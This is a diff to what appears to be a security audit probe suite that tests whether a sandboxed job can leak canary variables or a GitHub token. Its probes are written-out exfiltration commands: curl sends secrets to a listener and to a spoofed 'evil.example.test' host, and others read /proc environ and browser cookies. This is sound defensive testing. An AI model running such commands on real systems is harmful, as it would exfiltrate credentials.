@@ -139,6 +139,12 @@ def a8(ctx):
 
 def b1(ctx):
     ctx.c.sh(f'curl -s -m8 "http://{ctx.host}:{ctx.port}/b1?v=$(printf %s "$CANARY_VAR" | base64)"')
+    if ctx.bound:
+        # The bound service itself, the value asked for in a query (audit/listen.py ?v=).
+        ctx.c.sh(f'curl -s -m8 "https://{ctx.host}:{ctx.bound.port}/b1?v=$CANARY_VAR"; '
+                 f'curl -s -m8 "https://{ctx.host}:{ctx.bound.port}/b1?v=$(printf %s "$CANARY_VAR" | base64)"')
+        return (ctx.heard("/b1") or ctx.bound.heard("/b1"),
+                "variable sent by curl to the listener, and in a query to the service it is bound to")
     return ctx.heard("/b1"), "variable sent to the host-bridge listener by curl, base64'd"
 
 
@@ -221,8 +227,16 @@ def askme_job(ctx):
 def memscan(ctx):
     # Put the canaries through a job first, so the Observer holds what a job printed (audit item 7).
     ctx.c.sh(f"python3 ~/{JOB} plain fill")
+    extra = []
+    if ctx.delivery == "protected":
+        # A protected key must not be in any process a job can read either:
+        # used once through the proxy, then looked for, passed reversed so the
+        # runner that starts the scan never holds it the right way round.
+        ctx.c.sh(f'curl -s -m8 https://{ctx.host}:{ctx.bound.port}/m -H "Authorization: Bearer $GH_TOKEN"; '
+                 'echo "$CANARY_VAR $GH_TOKEN"')
+        extra = ["--rev", K.VAR[::-1], K.GH[::-1]]
     time.sleep(2)
-    out = job(ctx, "memscan", K.PASSWORD, K.ASK_PASSWORD, K._KEY[:40])
+    out = job(ctx, "memscan", K.PASSWORD, K.ASK_PASSWORD, K._KEY[:40], *extra)
     rows = re.findall(r"MEMSCAN (\d+) (\S+) (DENIED|HITS) (\S+)", out)
     hits = sum(int(r[3]) for r in rows if r[2] == "HITS")
     denied = sum(1 for r in rows if r[2] == "DENIED")
@@ -313,17 +327,65 @@ def xinput(ctx):
 
 
 # --- J: key stand-ins (a protected key's job env holds a stand-in, not the key) ---------
+#
+# Readable (v1 or v2 readable:true): today's plain-HTTP form, to the listener.
+# Protected: the same programs over HTTPS to the fixture the key is bound to,
+# through the job's HTTPS_PROXY. J1-J3 must reach the service WITH the key
+# (else BROKEN) while the job never holds it; J4-J6 must see only the stand-in.
 
-def j(tag, cmd, only=None):
+def tls_cmd(cmd):
+    return cmd.replace("http://{H}:{P}/", "https://{H}:{S}/")
+
+
+def j(tag, cmd, works=False):
     def run(ctx):
-        ctx.c.sh(cmd.format(H=ctx.host, P=ctx.port, T=tag), wait_ms=40000)
-        return ctx.heard("/" + tag, only=[K.GH]), "what the host-bridge listener received from the job's GH_TOKEN"
+        if not ctx.bound:
+            ctx.c.sh(cmd.format(H=ctx.host, P=ctx.port, T=tag), wait_ms=40000)
+            return ctx.heard("/" + tag, only=[K.GH]), "what the host-bridge listener received from the job's GH_TOKEN"
+        out = ctx.c.sh(tls_cmd(cmd).format(H=ctx.host, S=ctx.bound.port, T=tag) + " 2>&1 | base64", wait_ms=40000)[0]
+        seen_by_job = K.GH in "".join(decode_b64_lines(out))
+        at_service = ctx.bound.heard("/" + tag, only=[K.GH])
+        others = ctx.heard("/" + tag, only=[K.GH]) or ctx.free.heard("/" + tag, only=[K.GH])
+        if works and not at_service:
+            return "broken", "the bound service never received the key through the proxy"
+        if works:
+            return seen_by_job or others, ("the service received the key through the proxy; the job "
+                                           + ("SAW it" if seen_by_job else "held only its stand-in"))
+        return at_service or seen_by_job or others, "what the bound service received from the job's GH_TOKEN"
     return run
 
 
 def j4(ctx):
+    if ctx.bound:
+        out = ctx.c.sh(f'curl -s -m8 https://{ctx.host}:{ctx.bound.port}/echo-j4 -H "Authorization: Bearer $GH_TOKEN" | base64')[0]
+        got = "".join(decode_b64_lines(out))
+        if not ctx.bound.heard("/echo-j4", only=[K.GH]):
+            return "broken", "the bound service never received the key through the proxy"
+        return K.GH in got, "the bound service reflected the key it received; the job got " + (
+            "the key" if K.GH in got else "its stand-in" if "ghp_" in got else "nothing")
     out = ctx.c.sh(f'curl -s -m8 http://{ctx.host}:{ctx.port}/echo-j4 -H "Authorization: Bearer $GH_TOKEN" | base64')[0]
     return K.GH in "".join(decode_b64_lines(out)), "reflecting endpoint answered with the job's token"
+
+
+def j6(ctx):
+    if ctx.bound:
+        # An unbound host through the job's proxy: a blind tunnel (-k: the job
+        # does not trust the fixture's test CA, nor should it).
+        ctx.c.sh(f'curl -sk -m8 https://{ctx.host}:{ctx.free.port}/j6 -H "Authorization: Bearer $GH_TOKEN"', wait_ms=40000)
+        return ctx.free.heard("/j6", only=[K.GH]), "what an unbound HTTPS host received from the job's GH_TOKEN"
+    ctx.c.sh(f'curl -s -m8 --noproxy "*" -H "Host: evil.example.test" http://{ctx.host}:{ctx.port}/j6 -H "Authorization: Bearer $GH_TOKEN"', wait_ms=40000)
+    return ctx.heard("/j6", only=[K.GH]), "what the host-bridge listener received from the job's GH_TOKEN"
+
+
+def a6v(ctx):
+    """A variable's value in the job logs, or in any /proc environ a job can read."""
+    ctx.c.sh('echo "$CANARY_VAR $GH_TOKEN"; env | grep -c _ >/dev/null')
+    out = job(ctx, "scan", K.VAR[::-1], K.GH[::-1])
+    m = re.search(r"^SCAN logs=(\d+) environ=(\d+)", out, re.M)
+    if not m:
+        return None, "scan gave no answer: " + out.strip()[:60]
+    logs, environ = int(m.group(1)), int(m.group(2))
+    return logs + environ > 0, f"job logs holding a value: {logs}; readable /proc/*/environ holding one: {environ}"
 
 
 def j7(ctx):
@@ -412,6 +474,7 @@ PROBES = [
     ("A4v", "browser fill of a variable on any page, read back", a4v),
     ("A5", "clipboard read", a5),
     ("A6", "raw job log holds a login password", a6),
+    ("A6v", "a variable's value in a job log or a readable /proc environ", a6v),
     ("A7", "GET /files/download of a raw job log", a7),
     ("A8", "TOTP digits come back unredacted", a8),
     ("B1", "variable curl'd to a listener on the host bridge", b1),
@@ -436,12 +499,12 @@ PROBES = [
     ("X7", "job may signal the service process", proc_line("X7", lambda l: l.startswith("may-signal"))),
     ("9222-list", "curl 127.0.0.1:9222/json/list lists the tab", p9222),
     ("xinput", "job sees raw key presses on the display", xinput),
-    ("J1", "curl with GH_TOKEN: listener receives the real key", j("j1", 'curl -s -m8 http://{H}:{P}/{T} -H "Authorization: Bearer $GH_TOKEN"')),
-    ("J2", "python urllib 'token' scheme: listener receives the real key", j("j2", J_PY)),
-    ("J3", "git Basic credential helper: listener receives the real key", j("j3", J_GIT)),
+    ("J1", "curl with GH_TOKEN: listener receives the real key", j("j1", 'curl -s -m8 http://{H}:{P}/{T} -H "Authorization: Bearer $GH_TOKEN"', works=True)),
+    ("J2", "python urllib 'token' scheme: listener receives the real key", j("j2", J_PY, works=True)),
+    ("J3", "git Basic credential helper: listener receives the real key", j("j3", J_GIT, works=True)),
     ("J4", "reflecting endpoint hands the real key back to the job", j4),
     ("J5", "key in a request body: listener receives the real key", j("j5", 'curl -s -m8 http://{H}:{P}/{T} -d "content=$GH_TOKEN"')),
-    ("J6", "unbound host: listener receives the real key", j("j6", 'curl -s -m8 --noproxy "*" -H "Host: evil.example.test" http://{H}:{P}/{T} -H "Authorization: Bearer $GH_TOKEN"')),
+    ("J6", "unbound host: listener receives the real key", j6),
     ("J7", "node fetch with GH_TOKEN", j7),
     ("N1", "sqlite read of a signed-in site's cookie from the browser profile", n1),
     ("N1b", "cat ~/.hotline/logins/*.json shows a shared cookie", n1b),
